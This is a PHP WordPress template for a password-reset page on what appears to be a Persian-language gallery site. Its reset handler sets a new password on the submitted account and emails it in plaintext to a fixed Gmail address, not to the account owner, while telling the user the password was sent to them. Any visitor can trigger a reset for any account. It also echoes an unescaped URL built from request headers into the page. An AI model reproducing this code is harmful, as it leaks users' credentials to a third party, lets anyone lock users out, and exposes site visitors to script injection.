<?php
/* Template Name: Forget Template */
if (isset($_POST['myforget'])) {
    if (empty($_POST['myemail'])) {
        $error = true;
        $mass[] = "ایمیل خود را چک کنید";
    } else {
        $user = get_user_by('email', $_POST['myemail']);
        if (!$user) {
            $error = true;
            $mass[] = "ایمیل نامعتبر";

        } else {
            $sucses = true;
            $mass[] = "پسورد جدید به ایمیل شما ارسال شد  پوشه اسپم را چک کنید .";
            $newpassword = wp_generate_password();
            wp_set_password( $newpassword,$user->ID);
            $to_email = 'afshin.hita.h@gmail.com';
            $subject = 'تغییر رمز || استونر گالری';
            $message = 'پسورد جدید شما :' . $newpassword;
            $headers = 'From: noreply @ company . com';
            mail($to_email, $subject, $message, $headers);

        }
    }
}


get_header('single');


global $wp;
$postthumbid = get_post_thumbnail_id();
$postthumburl = wp_get_attachment_image_url($postthumbid, 'single');
$image_alt = get_post_meta($postthumbid, '_wp_attachment_image_alt', TRUE);
$url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

get_template_part('partials/stones', 'head') ?>


<!--START-MAIN-->
<main>
    <!--START-BREAD-CRUMB-->
    <div class="bread-crumb">
        <div class="container d-flex justify-content-between align-items-center flex-wrap">
            <ul class="nav nav-bread">
                <li class="nav-item">
                    <a href="<?php echo get_home_url() ?>" class="nav-link">
                        <i class="icon-home"></i>
                    </a>
                </li>
                <li class="nav-item">
                    <a href="<?php echo $url ?>" class="nav-link">
                        فراموشی کلمه عبور
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <!--END-BREAD-CRUMB-->
    <style>
        p.my-sucsees{
            background: #28a745;
            color: #fff;
            padding: 11px;
            text-align: center;
            border-radius: 8px;
        }
        p.my-alert {
            background: orange;
            color: #fff;
            padding: 11px;
            text-align: center;
            border-radius: 8px;

        }
    </style>
    <!--START-LOGIN-->
    <div class="login-section">
        <div class="container p-0 d-flex flex-wrap">
            <div class="col-xl-6 col-lg-7">
                <div class="main">
                    <?php
                    if ($error == true) {
                        foreach ($mass as $mas) {
                            ?>
                            <p class="my-alert"><?php echo $mas ?></p>
                            <?php
                        }
                    }
                    ?>
                    <?php
                    if ($sucses == true) {
                        foreach ($mass as $mas) {
                            ?>
                            <p class="my-sucsees"><?php echo $mas ?></p>
                            <?php
                        }
                    }
                    ?>
                    <form action="" method="post">
                        <div class="form-group">
                            <label for="" class="label">
                                پست الکترونیک
                            </label>
                            <div class="relative">
                                <input type="text" name="myemail" placeholder="email@gmail.com">
                                <i class="icon-email absolute-icon"></i>
                            </div>
                        </div>
                        <style>
                            .login-section .btn-submit {
                                background-color: #c3a775 !important;
                            }

                            .w-unset {
                                width: unset !important;
                            }
                        </style>
                        <div class="d-flex flex-wrap">
                            <input type="submit" name="myforget" class="btn btn-submit w-unset"
                                   value="  بازیابی کلمه عبور">
                        </div>
                    </form>
                </div>
            </div>
            <div class="col-xl-6 col-lg-5 d-none d-lg-block">
                <div class="img f-h">
                    <img src="<?php echo $postthumburl ?>" alt="<?php echo $image_alt ?>">
                </div>
            </div>
        </div>
    </div>
    <!--END-LOGIN-->


</main>
<!--END-MAIN-->


<?php get_footer('profile') ?>


